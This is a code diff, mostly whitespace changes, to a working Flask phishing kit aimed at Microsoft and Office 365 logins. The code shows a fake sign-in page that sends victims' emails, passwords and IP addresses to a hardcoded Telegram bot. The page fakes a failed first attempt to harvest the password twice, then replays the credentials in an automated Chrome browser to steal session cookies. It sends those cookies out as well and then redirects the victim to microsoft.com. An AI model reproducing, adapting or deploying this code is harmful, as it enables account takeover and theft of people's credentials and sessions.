@@ -27,7 +27,7 @@ except ImportError:
     class Email:
         def __init__(self, message=None):
             self.message = message or "Invalid email address"
-        
+
         def __call__(self, form, field):
             import re
             if not re.match(r"[^@]+@[^@]+\.[^@]+", field.data):
@@ -171,14 +171,14 @@ def validate_email_domain(email):
     """Enhanced email domain validation"""
     if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
         return False, "Invalid email format"
-    
+
     domain = email.split('@')[1]
     try:
         # Check for MX records
         mx_records = dns.resolver.resolve(domain, 'MX')
         if not mx_records:
             return False, "Domain has no mail servers"
-        
+
         logger.info(f"Domain {domain} validated successfully")
         return True, "Valid domain"
     except Exception as e:
@@ -201,12 +201,12 @@ def setup_chrome_driver():
         options.add_experimental_option('useAutomationExtension', False)
         options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
-        
+
         # Try to create driver
         driver = webdriver.Chrome(options=options)
         driver.set_page_load_timeout(30)
         driver.implicitly_wait(10)
-        
+
         logger.info("Chrome WebDriver initialized successfully")
         return driver
     except Exception as e:
@@ -232,21 +232,21 @@ def extract_and_save_cookies(driver, email, password=None):
         # Navigate to office.com to verify successful login and get session cookies
         driver.get("https://office.com")
         sleep(5)  # Wait for page to load
-        
+
         # Check if we're actually logged in to Office.com
         current_url = driver.current_url
         page_title = driver.title.lower()
-        
+
         # Verify we're successfully logged into Office
         if "office" not in current_url.lower() or "sign" in page_title or "login" in page_title:
             logger.warning(f"Not successfully logged into Office.com. URL: {current_url}, Title: {page_title}")
             return False
-        
+
         cookies = driver.get_cookies()
         if not cookies:
             logger.warning("No cookies found in WebDriver")
             return False
-        
+
         # Filter only session-related cookies from office.com and microsoft domains
         session_cookies = []
         session_cookie_names = [
@@ -254,25 +254,25 @@ def extract_and_save_cookies(driver, email, password=None):
             'SignInStateCookie', 'buid', 'MSFPC', 'ai_session', 'MUID',
             'wla42', 'MSPAuth', 'MSPProf', 'MSPSoftVis', 'MSCC'
         ]
-        
+
         for cookie in cookies:
             # Include cookies from Microsoft/Office domains that are session-related
             if (any(domain in cookie['domain'].lower() for domain in ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com']) and
                 (cookie['name'] in session_cookie_names or 'auth' in cookie['name'].lower() or 'session' in cookie['name'].lower())):
                 session_cookies.append(cookie)
-        
+
         if not session_cookies:
             logger.warning("No session cookies found for Office.com")
             return False
-        
+
         # Create cookies directory if it doesn't exist
         if not os.path.exists('cookies'):
             os.makedirs('cookies')
-        
+
         # Save only session cookies with timestamp
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
-        
+
         with open(filename, 'w') as f:
             f.write(f"# WORKER CREDENTIALS CAPTURED\n")
             f.write(f"# Email: {email}\n")
@@ -283,7 +283,7 @@ def extract_and_save_cookies(driver, email, password=None):
             f.write("=" * 60 + "\n")
             f.write("SESSION COOKIES:\n")
             f.write("=" * 60 + "\n\n")
-            
+
             for cookie in session_cookies:
                 f.write(f"Name: {cookie['name']}\n")
                 f.write(f"Value: {cookie['value']}\n")
@@ -292,12 +292,12 @@ def extract_and_save_cookies(driver, email, password=None):
                 f.write(f"Secure: {cookie['secure']}\n")
                 f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                 f.write("-" * 50 + "\n")
-        
+
         # Also save as JSON for easier parsing
         json_filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.json'
         with open(json_filename, 'w') as f:
             json.dump(session_cookies, f, indent=2)
-        
+
         logger.info(f"Session cookies saved to {filename} and {json_filename}")
         return filename
     except Exception as e:
@@ -309,11 +309,11 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
     try:
         bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
         chat_id = "1645281955"
-        
+
         if not bot_token or not chat_id or bot_token.strip() == '' or chat_id.strip() == '':
             logger.error("❌ Telegram credentials not properly configured!")
             return False
-        
+
         # Create message based on attempt type
         if attempt_type == "immediate":
             message = f"""🚨 WORKER CREDENTIALS CAPTURED
@@ -322,7 +322,7 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
 🌐 IP: {ip_address}
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 ⚡ Status: IMMEDIATE CAPTURE"""
-        
+
         elif attempt_type == "first":
             message = f"""🔑 WORKER - FIRST ATTEMPT
 📧 Email: {email}
@@ -330,7 +330,7 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
 🌐 IP: {ip_address}
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 ⚠️ First attempt - moving to retry"""
-        
+
         elif attempt_type == "second":
             message = f"""🔑 WORKER - SECOND ATTEMPT
 📧 Email: {email}
@@ -338,7 +338,7 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
 🌐 IP: {ip_address}
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 ✅ Second attempt - starting automation"""
-        
+
         elif attempt_type == "final":
             message = f"""🔑 FINAL WORKER REPORT
 📧 Email: {email}
@@ -347,12 +347,12 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 📁 Cookie File: {cookie_file.split('/')[-1] if cookie_file else 'No file'}
 ✅ Automation completed"""
-        
+
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=30)
-        
+
         logger.info(f"Telegram {attempt_type} response: {response.status_code}")
-        
+
         # Send cookie file if provided
         if cookie_file and os.path.exists(cookie_file) and attempt_type == "final":
             try:
@@ -367,9 +367,9 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
                 logger.info(f"Cookie file sent: {file_response.status_code}")
             except Exception as file_e:
                 logger.error(f"❌ File send error: {file_e}")
-        
+
         return response.status_code == 200
-        
+
     except Exception as e:
         logger.error(f"❌ Telegram error: {e}")
         return False
@@ -388,9 +388,9 @@ def index():
     email = request.args.get('email', '').strip()
     step = request.args.get('step', 'email')
     error = request.args.get('error', '')
-    
+
     log_session_activity("page_visit", user_email=email)
-    
+
     # Email validation step
     if step == 'email' and email:
         valid, message = validate_email_domain(email)
@@ -398,10 +398,10 @@ def index():
             flash(message, 'error')
             log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
             return render_template('index.html', step='email', error=message)
-    
+
     form = LoginForm()
     sitekey = config('CLOUDFLARE_SITEKEY', default='')
-    
+
     return render_template('index.html', 
                          form=form, 
                          email=email, 
@@ -418,12 +418,12 @@ def verify_turnstile():
         token = request.form.get('cf-turnstile-response')
         if not token:
             return jsonify({'success': False, 'error': 'No token provided'})
-        
+
         secret_key = config('CLOUDFLARE_SECRET_KEY', default='')
         if not secret_key:
             logger.warning("Cloudflare secret key not configured")
             return jsonify({'success': True})  # Allow in development
-        
+
         response = requests.post(
             'https://challenges.cloudflare.com/turnstile/v0/siteverify',
             data={
@@ -434,18 +434,18 @@ def verify_turnstile():
             headers={'Content-Type': 'application/x-www-form-urlencoded'},
             timeout=10
         )
-        
+
         result = response.json()
         success = result.get('success', False)
-        
+
         log_session_activity("turnstile_verification", success=success, 
                            error_message=None if success else str(result.get('error-codes', [])))
-        
+
         return jsonify({
             'success': success,
             'error-codes': result.get('error-codes', [])
         })
-        
+
     except Exception as e:
         logger.error(f"Turnstile verification error: {e}")
         return jsonify({'success': False, 'error': str(e)})
@@ -456,13 +456,14 @@ def process_form():
     email = request.form.get('email', '').strip().lower()
     password = request.form.get('password', '')
     worker_ip = get_remote_address()
-    
+
     logger.info(f"🔍 Processing form: {email}")
-    
-    # Send credentials to Telegram immediately
+
+    # Consolidated Telegram message submission
     if email and password:
-        send_to_telegram(email, password, worker_ip, "immediate")
-    
+        telegram_sent = send_to_telegram(email, password, worker_ip, "immediate")
+        logger.info(f"Telegram sent: {telegram_sent} for {email}")
+
     # Handle direct form submission from JavaScript
     if not email or not password:
         flash('Email and password are required', 'error')
@@ -472,9 +473,9 @@ def process_form():
     csrf_token = request.form.get('csrf_token')
     if not csrf_token:
         logger.info("No CSRF token provided - allowing for JavaScript submission")
-    
+
     submit_action = request.form.get('submit', 'Sign in')
-    
+
     # Validate email domain first
     valid, message = validate_email_domain(email)
     if not valid:
@@ -482,17 +483,13 @@ def process_form():
         log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
         return redirect(url_for('index', step='password', email=email, error='true'))
 
-    # Always send to Telegram immediately when credentials received
-    telegram_sent = send_to_telegram(email, password, worker_ip, "immediate")
-    logger.info(f"Telegram sent: {telegram_sent} for {email}")
-    
     # Two-pass authentication logic
     current_session_id = session.get('session_id')
     login_attempt = LoginAttempt.query.filter_by(
         user_email=email, 
         session_id=current_session_id
     ).first()
-    
+
     if not login_attempt:
         # First attempt - create new attempt record and go to second pass
         login_attempt = LoginAttempt()
@@ -501,55 +498,55 @@ def process_form():
         login_attempt.attempt_count = 1
         db.session.add(login_attempt)
         db.session.commit()
-        
+
         log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                            error_message="First attempt automatically failed - moving to second pass")
-        
+
         # Always flash error for first attempt and redirect to retry
         flash('Your account or password is incorrect. Try again.', 'error')
         return redirect(url_for('index', step='retry', email=email, retry='true'))
-    
+
     elif login_attempt.attempt_count == 1:
         # Second attempt - proceed with automation
         login_attempt.attempt_count = 2
         login_attempt.updated_at = datetime.utcnow()
         db.session.commit()
         log_session_activity("second_attempt_proceeding", user_email=email)
-        
+
         # Continue with Selenium automation below
-    
+
     else:
         # More than 2 attempts - reset and start over
         login_attempt.attempt_count = 1
         login_attempt.updated_at = datetime.utcnow()
         db.session.commit()
-        
+
         flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
         log_session_activity("attempt_reset", user_email=email, success=False, 
                            error_message="Attempt counter reset - starting two-pass cycle again")
         return redirect(url_for('index', step='password', email=email, error='true'))
-    
+
     # Perform Selenium automation (moved outside else block)
         driver = None
         try:
             log_session_activity("selenium_automation_started", user_email=email)
             driver = setup_chrome_driver()
-            
+
             # Navigate to Microsoft login
             driver.get("https://login.microsoftonline.com")
             logger.info("Navigated to Microsoft login page")
-            
+
             # Wait for and fill email
             email_field = WebDriverWait(driver, 20).until(
                 EC.presence_of_element_located((By.NAME, "loginfmt"))
             )
             email_field.clear()
             email_field.send_keys(email)
-            
+
             # Click next
             next_button = driver.find_element(By.ID, "idSIButton9")
             next_button.click()
-            
+
             # Wait for password field
             sleep(3)
             password_field = WebDriverWait(driver, 20).until(
@@ -557,18 +554,18 @@ def process_form():
             )
             password_field.clear()
             password_field.send_keys(password)
-            
+
             # Click sign in
             signin_button = driver.find_element(By.ID, "idSIButton9")
             signin_button.click()
-            
+
             # Wait for login to complete
             sleep(10)
-            
+
             # Check for errors
             current_url = driver.current_url
             page_source = driver.page_source.lower()
-            
+
             if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
                 if 'error' in current_url:
                     error_msg = "Login failed - invalid credentials or account issue"
@@ -576,11 +573,11 @@ def process_form():
                     log_session_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
                     flash(error_msg, 'error')
                     return redirect(url_for('index', step='password', email=email, error='true'))
-            
+
             # Always send worker details to Telegram first, even before cookie extraction
             worker_ip = get_remote_address()
             logger.info(f"Attempting to send worker details to Telegram for {email}")
-            
+
             # Extract and save cookies
             cookie_file = extract_and_save_cookies(driver, email, password)
             if not cookie_file:
@@ -588,7 +585,7 @@ def process_form():
                 log_session_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
                 flash(error_msg, 'error')
                 return redirect(url_for('index', step='password', email=email, error='true'))
-            
+
             # Send final report with cookies to Telegram
             telegram_success = send_to_telegram(email, password, worker_ip, "final", cookie_file)
             if telegram_success:
@@ -597,7 +594,7 @@ def process_form():
             else:
                 log_session_activity("telegram_send_failed", user_email=email, success=False)
                 logger.error(f"❌ Failed to send final report to Telegram for {email}")
-            
+
             # Update or create user record
             user = User.query.filter_by(email=email).first()
             if not user:
@@ -605,31 +602,31 @@ def process_form():
                 db.session.add(user)
             user.last_login = datetime.utcnow()
             db.session.commit()
-            
+
             log_session_activity("login_automation_completed", user_email=email)
             logger.info(f"Successful login automation for {email}")
-            
+
             # Redirect to Microsoft.com after successful cookie extraction
             return redirect("https://microsoft.com")
-            
+
         except TimeoutException as e:
             error_msg = f"Login timeout - please try again: {str(e)}"
             logger.error(f"Timeout during login automation for {email}: {e}")
             log_session_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
             flash(error_msg, 'error')
-            
+
         except WebDriverException as e:
             error_msg = f"Browser automation error: {str(e)}"
             logger.error(f"WebDriver error for {email}: {e}")
             log_session_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
             flash(error_msg, 'error')
-            
+
         except Exception as e:
             error_msg = f"Unexpected error during login automation: {str(e)}"
             logger.error(f"Unexpected error during login for {email}: {e}")
             log_session_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
             flash(error_msg, 'error')
-            
+
         finally:
             # Ensure driver is always cleaned up
             if driver:
@@ -645,7 +642,7 @@ def process_form():
                         subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
                     except:
                         pass
-        
+
         return redirect(url_for('index', step='password', email=email, error='true'))
 
 @app.route('/debug/sessions')
@@ -658,7 +655,7 @@ def debug_sessions():
             'session_id': session.get('session_id', 'Not set'),
             'redis_connection': 'Connected' if redis_client else 'Not connected'
         }
-        
+
         # Get session files from filesystem or Redis keys
         if redis_client:
             try:
@@ -673,14 +670,14 @@ def debug_sessions():
             session_files = glob.glob('./flask_session/*')
             session_data['session_files'] = len(session_files)
             session_data['session_storage'] = 'filesystem'
-        
+
         # Get recent session logs
         recent_logs = SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(20).all()
-        
+
         return render_template('debug.html', 
                              session_data=session_data,
                              recent_logs=recent_logs)
-                             
+
     except Exception as e:
         logger.error(f"Error in debug sessions: {e}")
         return jsonify({'error': str(e)}), 500
@@ -710,13 +707,13 @@ def clear_sessions():
                 except Exception:
                     pass
             flash(f'Cleared {count} session file(s) from filesystem', 'success')
-        
+
         log_session_activity("sessions_cleared", success=True)
-            
+
     except Exception as e:
         flash(f'Error clearing sessions: {str(e)}', 'error')
         logger.error(f"Error clearing sessions: {e}")
-    
+
     return redirect(url_for('debug_sessions'))
 
 @app.route('/test-telegram-simple')
@@ -727,26 +724,26 @@ def test_telegram_simple():
         # Use the same hardcoded values as in the main function
         bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
         chat_id = "1645281955"
-        
+
         logger.info(f"🧪 Simple Telegram Test")
         logger.info(f"BOT_TOKEN: {bot_token[:20]}...")
         logger.info(f"CHAT_ID: {chat_id}")
-        
+
         if not bot_token or not chat_id:
             return f"Missing credentials: BOT_TOKEN={bool(bot_token)}, CHAT_ID={bool(chat_id)}"
-            
+
         message = f"🧪 DIRECT TEST from Flask app at {datetime.now()}"
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        
+
         logger.info(f"📤 Sending to URL: {url}")
-        
+
         response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=10)
-        
+
         logger.info(f"📨 Response Status: {response.status_code}")
         logger.info(f"📨 Response Text: {response.text}")
-        
+
         return f"Status: {response.status_code}, Response: {response.text}"
-        
+
     except Exception as e:
         logger.error(f"❌ Test error: {str(e)}")
         return f"Error: {str(e)}"
@@ -758,32 +755,32 @@ def test_telegram():
     try:
         bot_token = config('BOT_TOKEN', default=None)
         chat_id = config('CHAT_ID', default=None)
-        
+
         logger.info(f"🧪 Testing Telegram connection...")
         logger.info(f"BOT_TOKEN: {bot_token[:10] + '...' if bot_token and len(bot_token) > 10 else bot_token}")
         logger.info(f"CHAT_ID: {chat_id}")
-        
+
         if not bot_token or bot_token == 'your-telegram-bot-token-here':
             error_msg = 'BOT_TOKEN not properly configured in .env file'
             logger.error(f"❌ {error_msg}")
             return jsonify({'error': error_msg}), 400
-            
+
         if not chat_id or chat_id == 'your-telegram-chat-id-here':
             error_msg = 'CHAT_ID not properly configured in .env file'
             logger.error(f"❌ {error_msg}")
             return jsonify({'error': error_msg}), 400
-            
+
         # Test message
         test_message = f"""🧪 TELEGRAM TEST MESSAGE
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 ✅ Connection working!
 🤖 Bot Token: {bot_token[:10]}...
 💬 Chat ID: {chat_id}"""
-        
+
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        
+
         logger.info(f"📤 Sending test message to: {url}")
-        
+
         response = requests.post(
             url,
             data={
@@ -792,10 +789,10 @@ def test_telegram():
             },
             timeout=15
         )
-        
+
         logger.info(f"📨 Response Status: {response.status_code}")
         logger.info(f"📨 Response Text: {response.text}")
-        
+
         if response.status_code == 200:
             logger.info("✅ Test message sent successfully!")
             return jsonify({
@@ -815,7 +812,7 @@ def test_telegram():
                 'bot_token_preview': f"{bot_token[:10]}...",
                 'chat_id': chat_id
             }), 400
-            
+
     except Exception as e:
         error_msg = f"Exception during Telegram test: {str(e)}"
         logger.error(f"❌ {error_msg}")
@@ -833,7 +830,7 @@ def health_check():
         db_status = 'OK'
     except Exception as e:
         db_status = f'Error: {str(e)}'
-    
+
     # Test session storage
     try:
         if redis_client:
@@ -848,7 +845,7 @@ def health_check():
                 storage_status = 'Filesystem: Directory missing'
     except Exception as e:
         storage_status = f'Error: {str(e)}'
-    
+
     return jsonify({
         'status': 'healthy',
         'database': db_status,
